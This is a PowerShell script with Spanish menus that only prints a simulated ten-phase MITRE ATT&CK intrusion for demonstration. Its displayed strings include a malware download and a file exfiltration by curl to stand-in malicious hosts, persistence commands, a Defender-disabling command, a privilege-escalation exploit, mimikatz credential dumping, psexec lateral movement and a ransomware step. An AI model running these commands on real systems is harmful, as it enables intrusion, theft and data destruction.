Clear-Host

function Write-HackerLine {
    param (
        [string]$Text,
        [int]$Speed = 10,
        [ConsoleColor]$Color = 'Green'
    )
    foreach ($char in $Text.ToCharArray()) {
        Write-Host $char -NoNewline -ForegroundColor $Color
        Start-Sleep -Milliseconds $Speed
    }
    Write-Host ""
}

function Simulate-Command {
    param (
        [string]$Command,
        [string[]]$Output,
        [int]$Delay = 300
    )

    Write-Host "`nPS C:\Users\attacker>" -NoNewline -ForegroundColor DarkGray
    Write-Host $Command -ForegroundColor White
    Start-Sleep -Milliseconds $Delay

    foreach ($line in $Output) {
        Write-HackerLine $line -Speed 10
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
    }
}

function Show-PhaseTitle {
    param ([string]$Title)
    Write-Host "`n========== $Title ==========" -ForegroundColor Cyan
}

function Show-Banner {
    Clear-Host
    Write-Host "██████╗░███████╗██╗░░░██╗░█████╗░██████╗░███████╗" -ForegroundColor Green
    Write-Host "██╔══██╗██╔════╝██║░░░██║██╔══██╗██╔══██╗██╔════╝" -ForegroundColor Green
    Write-Host "██████╔╝█████╗░░╚██╗░██╔╝███████║██████╦╝█████╗░░" -ForegroundColor Green
    Write-Host "██╔═══╝░██╔══╝░░░╚████╔╝░██╔══██║██╔══██╗██╔══╝░░" -ForegroundColor Green
    Write-Host "██║░░░░░███████╗░░╚██╔╝░░██║░░██║██████╦╝███████╗" -ForegroundColor Green
    Write-Host "╚═╝░░░░░╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚══════╝" -ForegroundColor Green
    Write-Host " Simulación de Ataque (Fases MITRE Interactivas) " -ForegroundColor DarkGray
    Write-Host ""
}

# ================= FASES ===================

function Fase-1-AccesoInicial {
    Show-PhaseTitle "FASE 1 - ACCESO INICIAL"
    Simulate-Command "curl http://malicious.example/malware.exe -o loader.exe" @("Downloading malware...", "Saved as loader.exe")
    Simulate-Command ".\loader.exe" @("[*] Establishing C2 connection...", "[+] Beacon sent to 192.168.1.100:443")
}

function Fase-2-Persistencia {
    Show-PhaseTitle "FASE 2 - PERSISTENCIA"
    Simulate-Command "reg add HKCU\...\Run /v Updater /d C:\Users\Public\payload.exe" @("The operation completed successfully.")
    Simulate-Command "schtasks /create /tn UpdaterTask ..." @("Task created successfully.")
}

function Fase-3-Escalacion {
    Show-PhaseTitle "FASE 3 - ESCALACIÓN DE PRIVILEGIOS"
    Simulate-Command "exploit.exe --local CVE-2021-1732" @("[+] Privileges escalated to SYSTEM")
}

function Fase-4-Evasion {
    Show-PhaseTitle "FASE 4 - EVASIÓN DE DEFENSAS"
    Simulate-Command "Set-MpPreference -DisableRealtimeMonitoring $true" @("Realtime protection disabled.")
    Simulate-Command "powershell -enc JABjAGwAaQBlAG4AdA..." @("[+] Encoded command executed")
}

function Fase-5-Credenciales {
    Show-PhaseTitle "FASE 5 - ACCESO A CREDENCIALES"
    Simulate-Command ".\mimikatz.exe" @("sekurlsa::logonpasswords", "admin:Password123!", "it.jgarcia:Spring2025!")
}

function Fase-6-Descubrimiento {
    Show-PhaseTitle "FASE 6 - DESCUBRIMIENTO"
    Simulate-Command "net view /domain" @("\\HR-PC", "\\FINANCE-SQL", "\\STORAGE-01")
    Simulate-Command "net user /domain" @("User list: admin, hr.manager, it.support")
}

function Fase-7-MovLateral {
    Show-PhaseTitle "FASE 7 - MOVIMIENTO LATERAL"
    Simulate-Command "psexec \\FINANCE-PC cmd.exe" @("Remote shell obtained")
    Simulate-Command "copy revshell.exe \\FINANCE-PC\C$\temp\" @("1 file(s) copied.")
}

function Fase-8-Coleccion {
    Show-PhaseTitle "FASE 8 - COLECCIÓN"
    Simulate-Command "dir \\FINANCE-PC\C$\Users\*\Documents\*.xlsx" @("payroll.xlsx", "bonuses_q1.xlsx")
}

function Fase-9-Exfiltracion {
    Show-PhaseTitle "FASE 9 - EXFILTRACIÓN"
    Simulate-Command "Compress-Archive C:\loot\* data.zip" @("Archive created.")
    Simulate-Command "curl -F 'file=@data.zip' http://malicious.site/upload" @("[+] File exfiltrated.")
}

function Fase-10-Impacto {
    Show-PhaseTitle "FASE 10 - IMPACTO"
    Simulate-Command "encrypt.exe C:\Shared" @("Files encrypted: 3200")
    Simulate-Command "echo 'Pay 2 BTC' > C:\Shared\README.txt" @("Ransom note dropped.")
}

# ================= MENU ===================

function Show-Menu {
    Show-Banner
    Write-Host "[1] Acceso Inicial"
    Write-Host "[2] Persistencia"
    Write-Host "[3] Escalación de Privilegios"
    Write-Host "[4] Evasión de Defensas"
    Write-Host "[5] Acceso a Credenciales"
    Write-Host "[6] Descubrimiento"
    Write-Host "[7] Movimiento Lateral"
    Write-Host "[8] Colección"
    Write-Host "[9] Exfiltración"
    Write-Host "[10] Impacto"
    Write-Host "[0] Salir"
    Write-Host ""
}

do {
    Show-Menu
    $choice = Read-Host "Selecciona una fase"

    switch ($choice) {
        "1" { Fase-1-AccesoInicial }
        "2" { Fase-2-Persistencia }
        "3" { Fase-3-Escalacion }
        "4" { Fase-4-Evasion }
        "5" { Fase-5-Credenciales }
        "6" { Fase-6-Descubrimiento }
        "7" { Fase-7-MovLateral }
        "8" { Fase-8-Coleccion }
        "9" { Fase-9-Exfiltracion }
        "10" { Fase-10-Impacto }
        "0" {
            Write-Host "Saliendo..." -ForegroundColor Yellow
            break
        }
        default {
            Write-Host "Opción inválida. Intenta de nuevo." -ForegroundColor Red
        }
    }

    if ($choice -ne "0") {
        Write-Host "`nPresiona ENTER para volver al menú..."
        Read-Host
    }

} while ($choice -ne "0")
